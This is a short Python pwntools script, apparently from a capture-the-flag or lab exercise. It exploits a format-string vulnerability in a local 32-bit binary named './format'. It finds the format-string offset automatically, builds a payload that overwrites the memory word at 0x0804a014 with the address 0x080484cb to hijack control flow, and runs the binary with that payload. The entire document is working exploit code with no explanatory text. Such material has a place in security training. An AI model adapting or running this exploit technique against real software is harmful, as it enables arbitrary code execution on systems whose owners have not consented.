#!/usr/bin/env python
from pwn import *

def exec_fmt(payload):
	p = process(['./format', payload])
	return p.recvall()

context.clear(arch = 'i386')
autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
writes = {0x0804a014 : 0x14, 0x0804a014+1 : 0xa0, 0x0804a014+2 : 0x04, 0x0804a014+3 : 0x08}
payload = fmtstr_payload(offset, {0x0804a014 : 0x080484cb}, write_size = 'short')

# payload = fmtstr_payload(offset, {0x0804a014 : 0x080484cb})
print repr(fmtstr_payload(offset, {0x0804a014 : 0x080484cb}, write_size = 'byte'))
p = process(['./format', payload])
